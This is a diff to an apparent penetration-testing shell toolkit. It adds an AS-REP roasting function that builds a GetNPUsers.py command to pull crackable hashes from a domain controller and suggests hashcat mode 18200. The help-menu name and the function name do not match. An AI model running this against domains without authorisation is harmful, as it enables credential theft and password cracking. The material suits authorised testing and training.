@@ -16,6 +16,7 @@ nb-ad-kerb-install        installs dependencies
 nb-ad-kerb-nmap-sweep     scan a network for services
 nb-ad-kerb-tcpdump        capture traffic to and from a host
 nb-ad-kerb-kerberoast     get SPN for a service account
+nb-ad-kerb-asreproast     hunt for users with kerberoast pre-auth not required
 
 DOC
 }
@@ -62,4 +63,25 @@ nb-ad-kerb-kerberoast() {
     else
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
     fi
+}
+
+nb-ad-asreproast() {
+  __ask "Did you enumerate users into a userlist file? (y/n)"
+  local sh && __askvar sh "ANSWER"
+
+  if [[ $sh == "n" ]]; then
+    __err "You need a valid userlist file to perform asrep roasting."
+    __info "Use nb-ad-enum-kerbrute-users."
+    exit 1
+  fi
+
+	__ask "Enter the IP address of the target domain controller"
+	nb-vars-set-rhost
+  nb-vars-set-domain
+	__ask "Enter a users wordlist"
+  __askpath ul FILE $HOME/desktop/projects/
+
+	print -z "GetNPUsers.py -dc-ip ${__RHOST} ${__DOMAIN}.local/ -no-pass -usersfile $ul | tee $(__domadpath)/GetNPUsers.txt"
+
+  __info "You can then crack this hash with mode '18200' using 'nb-crack-list'"
 }
